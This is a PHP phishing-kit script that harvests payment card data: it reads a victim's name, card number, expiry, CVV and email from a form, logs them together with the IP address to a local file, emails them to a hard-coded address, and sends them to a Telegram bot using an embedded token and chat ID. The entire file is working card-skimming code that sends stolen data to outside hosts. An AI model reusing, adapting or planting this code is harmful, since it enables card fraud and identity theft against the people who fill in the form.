<?php
$pg=$_REQUEST['page'];
$ip = getenv("REMOTE_ADDR");
$bin4 = substr($_POST['s9'] , 0 , 16);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$date = date("H:i:s | d/m/Y");
$ip = $_SERVER['REMOTE_ADDR'];
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;


if(($_POST['s1'] != "")  AND ($_POST['s9'] != "") AND ($_POST['s3'] != "")  AND ($_POST['s4'] != "") AND ($_POST['s5'] != "") )
{
$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "full name     : ".$_POST['s1']."\n";
$message .= "CARD NUMNB      : ".$_POST['s9']."\n";
$message .= "expry      : ".$_POST['s3']."/".$_POST['s4']."\n";
$message .= "ccv      : ".$_POST['s5']."\n";
$message .= "email      : ".$_POST['s6']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "---------------------- IT  ; ----------------------\n";
$s2    = str_replace(' ', '', $s2);
$binq     = str_replace(' ', '', $_POST['s2']);
$binq     = substr($binq, 0, 6);
$bin4 = substr($_POST['s9'] , 12 , 16);
$to = "ousafi@yahoo.com";
$subj = "IT CC ".$ip."\n";
$from = "From: ARU <zabi@a2plcpnl0176.prod.iad2.secureserver.net>";

/////////////////////////////////// file txt code ////////
$dt = "+++++++++++++++++++++++++++".$date."\n";
$nmsg = $dt.$subj.$message ;
$file = fopen("../9al.txt","a+") ;
fwrite($file, $nmsg."\n\n\n\n");
fclose($file);

/////////////////////////////////////////////////////////
mail($to, $subj, $message, $from);
echo "<meta http-equiv='refresh' content='0; url=./lod.php?page=$bin4'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; url=https://serverfault.com/questions/' />";
}

$token = "1220651941:AAGYicj2By8ztSFgPSHZBD5qPKHOXnNvVvM";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=809875026&text=" . urlencode($message)."" );

?>